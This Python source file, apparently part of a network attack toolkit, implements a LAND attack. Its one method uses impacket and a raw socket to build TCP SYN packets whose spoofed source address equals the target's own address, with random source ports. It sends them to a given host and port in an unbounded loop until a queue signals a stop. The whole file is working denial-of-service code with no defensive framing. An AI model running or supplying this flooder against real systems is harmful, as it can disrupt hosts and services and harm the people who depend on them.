import socket
from impacket import ImpactPacket
from attack_means import random_api as ram
from attack_means import tools as tm
from multiprocessing import Queue
import time


class LandAttack:
    @staticmethod
    def send_land_attack_packets(destination_ip_address: str, destination_port: int, stop_signal_queue: Queue):
        raw_socket = tm.Tools.raw_socket_creator(socket.IPPROTO_TCP)
        current_sent_packet = 1
        while True:
            if not stop_signal_queue.empty():
                break
            # generate packet
            ip_packet = ImpactPacket.IP()
            ip_packet.set_ip_src(destination_ip_address)
            ip_packet.set_ip_dst(destination_ip_address)
            tcp_packet = ImpactPacket.TCP()
            tcp_packet.set_SYN()
            tcp_packet.set_th_dport(destination_port)
            tcp_packet.set_th_sport(ram.RandomApi.rand_int(32768, 65535))
            ip_packet.contains(tcp_packet)
            raw_socket.sendto(ip_packet.get_packet(), (destination_ip_address, destination_port))
            # 打印日志
            # print(f"current {current_sent_packet} packet")
            current_sent_packet += 1
            # time.sleep(1)